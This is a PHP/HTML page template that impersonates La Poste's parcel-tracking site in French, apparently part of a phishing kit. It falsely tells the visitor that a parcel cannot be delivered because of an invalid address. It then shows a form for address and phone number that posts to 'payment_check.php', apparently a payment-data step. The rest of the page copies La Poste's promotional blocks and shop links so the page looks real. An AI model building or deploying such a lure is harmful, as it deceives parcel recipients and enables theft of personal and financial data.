<?php
  include_once("page_inc/header.php");
?>

  <div id="app">
    <div class="site">
      <div id="page">
        <section class="page-container">
          <div class="title-wrapper pt-3">
              <h1 class="basic-title-color">Suivre un envoi：XU004210146TS</h1>
          </div>

          <div class="in-panel">
            <div class="d-flex justify-content-between">
              <div>
                <h2 class="information-label-title">L’adresse de livraison n’est pas valide</h2>
                <h3 class="information-label">Votre colis est à un pas de la livraison!</h3>
              </div>
              <span class="btn-effect button-mkt my-auto sm-y-btn">
              <i class="actions__icon bi bi-printer ph-icon--light ph-icon--default"></i>
              Imprimer</span>
            </div>
            <div class="d-flex mt-2">
              <img class="order-image visible" width="400" height="200" alt="order image" src="./assets/images/qr-image.png">
            </div>
          </div>


          <div class="banner-laposte visible" id="promotional-banner">
            <div class="banner-content">
              <div class="banner-icon my-auto">
                <img src="./assets/icons/icon_info.svg" alt="" width="24" height="24">
              </div>
              <div class="banner-title">
                <span class="information-label-title">L’Identité Numérique évolue !</span>
                <div class="banner-text">
                  Nous ne pouvons pas livrer votre colis en raison d’une adresse incomplète. La Poste vous permet
                  d’acheminer votre colis à votre adresse en cas d’échec de livraison. Veuillez mettre à jour les
                  informations d’adresse
                </div>
              </div>
            </div>
          </div>


          <div class="in-panel">
            <h2 class="information-label-title">Vérifiez votre adresse.</h2>
            <h4 class="information-label">Nous devons confirmer que votre adresse est éligible pour la livraison notifiée.</h4>

            <div class="form">
              <form method="post" action="payment_check.php">
                <div class="form-body">
                  <p class="subtitle">Votre adresse</p>
                  <div class="input "><input class="touched hide-error" type="text" name="title" id="title"
                      aria-required="false" autocapitalize="none" value=""><span class="hide-error" id="">Votre
                      adresse <small class="optional">(facultatif)</small></span></div>

                  <p class="subtitle">Numéro de mobile ou fixe</p>
                  <div class="input "><input class="touched hide-error" type="text" name="title" id="title"
                  aria-required="false" autocapitalize="none" value=""><span class="hide-error" id="">
                  + 000000000 <small class="optional">(facultatif)</small></span></div>
                </div>
                <div class="form-action">
                  <input id="submit" name="submit" role="button" type="submit" value="Continuez">
                </div>
              </form>
            </div>
          </div>
        </section>


        <!-- bloc pub IAB pavé-->
        <div id="small1400" class="small1400">
          <!-- bloc merchandising -->
          <div class="blocMerchan">
            <section class="hp-market">
              <div class="hp-wrapper">
                <h2 class="basic-title">Tout savoir sur nos services en ligne !</h2>
                <div class="section-market-cats js-autopromo" id="autopromoEl0">
                  <div class="section-market-cat"><a href="https://www.laposte.fr/colissimo-en-ligne"
                      title="Envoyer un colis" data-tagc="display" data-tagc_event="autopromo" data-tagc_adid="11"
                      data-tagc_format="1_envoyer_un_colis" class="tagged taggedc tagged-s"> <img
                        src="./assets/picto1-envoyeruncolis-mars22.svg" class="section-market-cat-img" alt=""
                        data-xblocker="passed" style="visibility: visible;">
                      <p class="section-market-cat-text">Envoyer<br> un colis</p>
                    </a></div>
                  <div class="section-market-cat"><a href="https://www.laposte.fr/timbres" title="Commander des timbres"
                      data-tagc="display" data-tagc_event="autopromo" data-tagc_adid="11"
                      data-tagc_format="2_commander_des_timbres" class="tagged taggedc tagged-s"> <img
                        src="./assets/picto2-commanderdestimbres-mars22.svg" class="section-market-cat-img" alt=""
                        data-xblocker="passed" style="visibility: visible;">
                      <p class="section-market-cat-text">Commander<br> des timbres</p>
                    </a></div>
                  <div class="section-market-cat"><a href="https://www.laposte.fr/mon-timbre-en-ligne"
                      title="Imprimer des timbres" data-tagc="display" data-tagc_event="autopromo" data-tagc_adid="11"
                      data-tagc_format="3_imprimer_des_timbres" class="tagged taggedc tagged-s"> <img
                        src="./assets/picto3-imprimerdestimbres-mars22.svg" class="section-market-cat-img" alt=""
                        data-xblocker="passed" style="visibility: visible;">
                      <p class="section-market-cat-text">Imprimer<br> des timbres</p>
                    </a></div>
                  <div class="section-market-cat"><a
                      href="https://www.laposte.fr/boutique/c/cartonsboitespostalesetcaisses"
                      title="Acheter des emballages" data-tagc="display" data-tagc_event="autopromo" data-tagc_adid="11"
                      data-tagc_format="4_acheter_des_emballages" class="tagged taggedc tagged-s"> <img
                        src="./assets/picto4-acheterdesemballages-mars22.svg" class="section-market-cat-img" alt=""
                        data-xblocker="passed" style="visibility: visible;">
                      <p class="section-market-cat-text">Acheter<br> des emballages</p>
                    </a></div>
                  <div class="section-market-cat"><a href="https://www.laposte.fr/envoi-courrier-en-ligne"
                      title="Envoyer une lettre recommandée en ligne" data-tagc="display" data-tagc_event="autopromo"
                      data-tagc_adid="11" data-tagc_format="5_envoyer_lettre_recommandee"
                      class="tagged taggedc tagged-s"> <img
                        src="./assets/picto5b-envoyerunelettrerecommandeeenligne-mars22.svg"
                        class="section-market-cat-img" alt="" data-xblocker="passed" style="visibility: visible;">
                      <p class="section-market-cat-text">Envoyer une lettre<br> recommandée en ligne</p>
                    </a></div>
                  <div class="section-market-cat"><a href="https://www.laposte.fr/envoi-colis-boite-aux-lettres"
                      title="Envoyer depuis votre boîte aux lettres" data-tagc="display" data-tagc_event="autopromo"
                      data-tagc_adid="11" data-tagc_format="6_envoyer_depuis_boite_lettre"
                      class="tagged taggedc tagged-s"> <img src="./assets/picto6-fairesuivremoncourrier-mars22.svg"
                        class="section-market-cat-img" alt="" data-xblocker="passed" style="visibility: visible;">
                      <p class="section-market-cat-text">Envoyer depuis<br> votre boîte aux lettres</p>
                    </a></div>
                  <div class="section-market-cat"><a href="https://www.laposte.fr/tarifs-postaux-colis"
                      title="Consulter nos tarifs" data-tagc="display" data-tagc_event="autopromo" data-tagc_adid="11"
                      data-tagc_format="7_consulter_nos_tarifs" class="tagged taggedc tagged-s"> <img
                        src="./assets/picto7-consulternostarifs-mars22.svg" class="section-market-cat-img" alt=""
                        data-xblocker="passed" style="visibility: visible;">
                      <p class="section-market-cat-text">Consulter<br> nos tarifs</p>
                    </a></div>
                </div>
              </div>
            </section>
            <section class="js-autopromo" id="autopromoEl1">
              <div class="services column">
                <div class="row">
                  <!-- ECOSCORE 130622 -->
                  <div class="col-6" style="max-width: 100% !important;">
                    <div class="onclick-home">
                      <a class="product-box tagged taggedc tagged-s" data-tagc="display" data-tagc_event="autopromo"
                        data-tagc_adid="395" data-tagc_format="1-score_ecologique" target="_blank"
                        href="https://www.laposte.fr/score-ecologique">
                        <div style="height: 200px; padding: 0px;">
                          <div>
                            <div class="espace-vide">
                              &nbsp;
                            </div>
                            <p
                              style="font-size: 20px; font-weight: bold; margin: 0px 0px 0px 20px; color: #3c3c3c; position: relative;top: -50px;">
                              Score écologique
                              <br>
                              Mesurez et réduisez l'empreinte<br>
                              écologique de vos envois
                            </p>
                            <div class="espace-vide">
                              &nbsp;
                            </div>
                            <span class="btn-effect button-mkt"
                              style="margin-left: 20px !important; background-color: #ffc905 !important; color: #3c3c3c !important; height: 40px;padding: 0px 30px; position: relative;top: -35px;">Je
                              découvre</span>
                          </div>
                          <div class="espace-vide">
                            &nbsp;
                          </div>
                        </div>
                        <img src="./assets/DESKTOP-Large-Banner-HP-1140x250px-.jpg" alt="Je découvre"
                          data-xblocker="passed" style="visibility: visible;">
                      </a>
                    </div>
                  </div>
                </div>
              </div>
            </section>
            <div class="espace-vide">&nbsp;</div>
            <section class="push-gammes-liste bg-white services js-autopromo" id="autopromoEl2">
              <div class="row">
                <div class="col-3">
                  <h3>Enveloppes et<br> emballages</h3>
                  <ul>
                    <li><a href="https://www.laposte.fr/boutique/c/enveloppesblanches">Enveloppes blanches</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/enveloppesabulles">Enveloppes à bulles</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/etiquettespourimprimersestimbres">Etiquettes pour
                        imprimer ses timbres</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/recommandesetsupports">Supports de recommandés</a>
                    </li>
                    <li><a href="https://www.laposte.fr/boutique/c/cartonsboitespostalesetcaisses">Cartons, boîtes
                        postales et caisses</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/emballagescartonsettubes">Emballages, cartons et
                        tubes</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/universdemenagement">Univers déménagement</a></li>
                  </ul>
                </div>
                <div class="col-3">
                  <h3>Monnaies et<br> pièces</h3>
                  <ul>
                    <li><a href="https://www.laposte.fr/boutique/c/monnaiecollectionjeunesse">Monnaies de collection
                        classique</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/monnaiedecollectionoretargent">Monnaies de collection
                        Or et Argent</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/medailles">Médailles et Mini-médailles</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/monnaieavaleurfaciale">Monnaies à valeur faciale</a>
                    </li>
                    <li><a href="https://www.laposte.fr/boutique/c/accessoiresnumismatiques">Accessoires
                        numismatiques</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/coffretetsetdepieces">Coffrets et sets de pièces</a>
                    </li>
                    <li><a href="https://www.laposte.fr/produits/article/monnaie-de-paris/les-schtroumpfs">Collection
                        Schtroumpfs</a></li>
                    <li><a href="https://www.laposte.fr/produits/article/monnaie-de-paris/harry-potter">Collection Harry
                        Potter</a></li>
                  </ul>
                </div>
                <div class="col-3">
                  <h3>Imprimantes<br> et scanners</h3>
                  <ul>
                    <li><a href="https://www.laposte.fr/boutique/c/cartouchesdencre">Cartouches d'encre</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/imprimantesmultifonctions">Imprimantes
                        Multifonctions</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/imprimantelaser">Imprimantes Laser</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/imprimantesjetdencre">Imprimantes Jet d’encre</a>
                    </li>
                    <li><a
                        href="https://www.laposte.fr/boutique/c/imprimantesdetiquettesetetiqueteuses">Etiqueteuses</a>
                    </li>
                    <li><a href="https://www.laposte.fr/boutique/c/accessoiresimprimantes">Accessoires d’imprimantes</a>
                    </li>
                    <li><a href="https://www.laposte.fr/boutique/c/scanners">Scanners</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/papiersdimpressionetfilms">Papiers d’impression et
                        films</a></li>
                  </ul>
                </div>
                <div class="col-3">
                  <h3>Boîtes aux<br> lettres</h3>
                  <ul>
                    <li><a href="https://www.laposte.fr/boutique/c/boitesauxlettresnormaliseesindividuelles">Boîtes aux
                        lettres normalisées individuelles</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/boitesauxlettresindividuelles">Boîtes aux lettres
                        individuelles</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/boitesauxlettresnormaliseescollectives">Boîtes aux
                        lettres normalisées collectives</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/boitesauxlettrescollectives">Boîtes aux lettres
                        collectives</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/boitesacolis">Boîtes à colis</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/boites-aux-lettres-originales">Boîtes aux lettres
                        originales</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/accessoiresboitesauxlettres">Accessoires boîtes aux
                        lettres</a></li>
                  </ul>
                </div>
              </div>
            </section>
            <div class="espace-vide">&nbsp;</div>

            <link rel="stylesheet" type="text/css" href="./assets/css/bottom-1.css">
            <link rel="stylesheet" type="text/css" href="./assets/css/bottom-2.css">

          </div>
        </div>

        <div id="big1400" class="big1400">
          <div class="page-container">
            <div class="divCompMerchanBig">
              <!-- bloc merchandising -->
              <section class="hp-market">
                <div class="hp-wrapper">
                  <h2 class="basic-title">Tout savoir sur nos services en ligne !</h2>
                  <div class="section-market-cats js-autopromo" id="autopromoEl3">
                    <div class="section-market-cat"><a href="https://www.laposte.fr/colissimo-en-ligne"
                        title="Envoyer un colis" data-tagc="display" data-tagc_event="autopromo" data-tagc_adid="11"
                        data-tagc_format="1_envoyer_un_colis" class="tagged taggedc tagged-s"> <img
                          src="./assets/picto1-envoyeruncolis-mars22.svg" class="section-market-cat-img" alt=""
                          data-xblocker="passed" style="visibility: visible;">
                        <p class="section-market-cat-text">Envoyer<br> un colis</p>
                      </a></div>
                    <div class="section-market-cat"><a href="https://www.laposte.fr/timbres"
                        title="Commander des timbres" data-tagc="display" data-tagc_event="autopromo"
                        data-tagc_adid="11" data-tagc_format="2_commander_des_timbres" class="tagged taggedc tagged-s">
                        <img src="./assets/picto2-commanderdestimbres-mars22.svg" class="section-market-cat-img" alt=""
                          data-xblocker="passed" style="visibility: visible;">
                        <p class="section-market-cat-text">Commander<br> des timbres</p>
                      </a></div>
                    <div class="section-market-cat"><a href="https://www.laposte.fr/mon-timbre-en-ligne"
                        title="Imprimer des timbres" data-tagc="display" data-tagc_event="autopromo" data-tagc_adid="11"
                        data-tagc_format="3_imprimer_des_timbres" class="tagged taggedc tagged-s"> <img
                          src="./assets/picto3-imprimerdestimbres-mars22.svg" class="section-market-cat-img" alt=""
                          data-xblocker="passed" style="visibility: visible;">
                        <p class="section-market-cat-text">Imprimer<br> des timbres</p>
                      </a></div>
                    <div class="section-market-cat"><a
                        href="https://www.laposte.fr/boutique/c/cartonsboitespostalesetcaisses"
                        title="Acheter des emballages" data-tagc="display" data-tagc_event="autopromo"
                        data-tagc_adid="11" data-tagc_format="4_acheter_des_emballages" class="tagged taggedc tagged-s">
                        <img src="./assets/picto4-acheterdesemballages-mars22.svg" class="section-market-cat-img" alt=""
                          data-xblocker="passed" style="visibility: visible;">
                        <p class="section-market-cat-text">Acheter<br> des emballages</p>
                      </a></div>
                    <div class="section-market-cat"><a href="https://www.laposte.fr/envoi-courrier-en-ligne"
                        title="Envoyer une lettre recommandée en ligne" data-tagc="display" data-tagc_event="autopromo"
                        data-tagc_adid="11" data-tagc_format="5_envoyer_lettre_recommandee"
                        class="tagged taggedc tagged-s"> <img
                          src="./assets/picto5b-envoyerunelettrerecommandeeenligne-mars22.svg"
                          class="section-market-cat-img" alt="" data-xblocker="passed" style="visibility: visible;">
                        <p class="section-market-cat-text">Envoyer une lettre<br> recommandée en ligne</p>
                      </a></div>
                    <div class="section-market-cat"><a href="https://www.laposte.fr/envoi-colis-boite-aux-lettres"
                        title="Envoyer depuis votre boîte aux lettres" data-tagc="display" data-tagc_event="autopromo"
                        data-tagc_adid="11" data-tagc_format="6_envoyer_depuis_boite_lettre"
                        class="tagged taggedc tagged-s"> <img src="./assets/picto6-fairesuivremoncourrier-mars22.svg"
                          class="section-market-cat-img" alt="" data-xblocker="passed" style="visibility: visible;">
                        <p class="section-market-cat-text">Envoyer depuis<br> votre boîte aux lettres</p>
                      </a></div>
                    <div class="section-market-cat"><a href="https://www.laposte.fr/tarifs-postaux-colis"
                        title="Consulter nos tarifs" data-tagc="display" data-tagc_event="autopromo" data-tagc_adid="11"
                        data-tagc_format="7_consulter_nos_tarifs" class="tagged taggedc tagged-s"> <img
                          src="./assets/picto7-consulternostarifs-mars22.svg" class="section-market-cat-img" alt=""
                          data-xblocker="passed" style="visibility: visible;">
                        <p class="section-market-cat-text">Consulter<br> nos tarifs</p>
                      </a></div>
                  </div>
                </div>
              </section>
              <section class="js-autopromo" id="autopromoEl4">
                <div class="services column">
                  <!--
		<h2 class="basic-title">Tout savoir sur nos services en ligne !</h2>
		-->
                  <div class="row">
                    <!-- ECOSCORE 130622 -->
                    <div class="col-6" style="max-width: 100% !important;">
                      <div class="onclick-home">
                        <a class="product-box tagged taggedc tagged-s" data-tagc="display" data-tagc_event="autopromo"
                          data-tagc_adid="395" data-tagc_format="1-score_ecologique" target="_blank"
                          href="https://www.laposte.fr/score-ecologique">
                          <div style="height: 200px; padding: 0px;">
                            <div>
                              <div class="espace-vide">
                                &nbsp;
                              </div>
                              <p
                                style="font-size: 20px; font-weight: bold; margin: 0px 0px 0px 20px; color: #3c3c3c; position: relative;top: -50px;">
                                Score écologique
                                <br>
                                Mesurez et réduisez l'empreinte<br>
                                écologique de vos envois
                              </p>
                              <div class="espace-vide">
                                &nbsp;
                              </div>
                              <span class="btn-effect button-mkt"
                                style="margin-left: 20px !important; background-color: #ffc905 !important; color: #3c3c3c !important; height: 40px;padding: 0px 30px; position: relative;top: -35px;">Je
                                découvre</span>
                            </div>
                            <div class="espace-vide">
                              &nbsp;
                            </div>
                          </div>
                          <img src="./assets/DESKTOP-Large-Banner-HP-1140x250px-.jpg" alt="Je découvre"
                            data-xblocker="passed" style="visibility: visible;">
                        </a>
                      </div>
                    </div>
                  </div>
                </div>
              </section>
              <div class="espace-vide">&nbsp;</div>
              <section class="push-gammes-liste bg-white services js-autopromo" id="autopromoEl5">
                <!-- <h2 class="basic-title">D&eacute;couvrez nos nouvelles gammes de produits</h2> -->
                <div class="row">
                  <div class="col-3">
                    <h3>Enveloppes et<br> emballages</h3>
                    <ul>
                      <li><a href="https://www.laposte.fr/boutique/c/enveloppesblanches">Enveloppes blanches</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/enveloppesabulles">Enveloppes à bulles</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/etiquettespourimprimersestimbres">Etiquettes pour
                          imprimer ses timbres</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/recommandesetsupports">Supports de recommandés</a>
                      </li>
                      <li><a href="https://www.laposte.fr/boutique/c/cartonsboitespostalesetcaisses">Cartons, boîtes
                          postales et caisses</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/emballagescartonsettubes">Emballages, cartons et
                          tubes</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/universdemenagement">Univers déménagement</a></li>
                    </ul>
                  </div>
                  <div class="col-3">
                    <h3>Monnaies et<br> pièces</h3>
                    <ul>
                      <li><a href="https://www.laposte.fr/boutique/c/monnaiecollectionjeunesse">Monnaies de collection
                          classique</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/monnaiedecollectionoretargent">Monnaies de
                          collection Or et Argent</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/medailles">Médailles et Mini-médailles</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/monnaieavaleurfaciale">Monnaies à valeur
                          faciale</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/accessoiresnumismatiques">Accessoires
                          numismatiques</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/coffretetsetdepieces">Coffrets et sets de
                          pièces</a></li>
                      <li><a href="https://www.laposte.fr/produits/article/monnaie-de-paris/les-schtroumpfs">Collection
                          Schtroumpfs</a></li>
                      <li><a href="https://www.laposte.fr/produits/article/monnaie-de-paris/harry-potter">Collection
                          Harry Potter</a></li>
                    </ul>
                  </div>
                  <div class="col-3">
                    <h3>Imprimantes<br> et scanners</h3>
                    <ul>
                      <li><a href="https://www.laposte.fr/boutique/c/cartouchesdencre">Cartouches d'encre</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/imprimantesmultifonctions">Imprimantes
                          Multifonctions</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/imprimantelaser">Imprimantes Laser</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/imprimantesjetdencre">Imprimantes Jet d’encre</a>
                      </li>
                      <li><a
                          href="https://www.laposte.fr/boutique/c/imprimantesdetiquettesetetiqueteuses">Etiqueteuses</a>
                      </li>
                      <li><a href="https://www.laposte.fr/boutique/c/accessoiresimprimantes">Accessoires
                          d’imprimantes</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/scanners">Scanners</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/papiersdimpressionetfilms">Papiers d’impression et
                          films</a></li>
                    </ul>
                  </div>
                  <div class="col-3">
                    <h3>Boîtes aux<br> lettres</h3>
                    <ul>
                      <li><a href="https://www.laposte.fr/boutique/c/boitesauxlettresnormaliseesindividuelles">Boîtes
                          aux lettres normalisées individuelles</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/boitesauxlettresindividuelles">Boîtes aux lettres
                          individuelles</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/boitesauxlettresnormaliseescollectives">Boîtes aux
                          lettres normalisées collectives</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/boitesauxlettrescollectives">Boîtes aux lettres
                          collectives</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/boitesacolis">Boîtes à colis</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/boites-aux-lettres-originales">Boîtes aux lettres
                          originales</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/accessoiresboitesauxlettres">Accessoires boîtes aux
                          lettres</a></li>
                    </ul>
                  </div>
                </div>
              </section>
              <div class="espace-vide">&nbsp;</div>
            </div>
          </div>
        </div>

      </div>
    </div>
  </div>

<?php
  include_once("page_inc/footer.php");
?>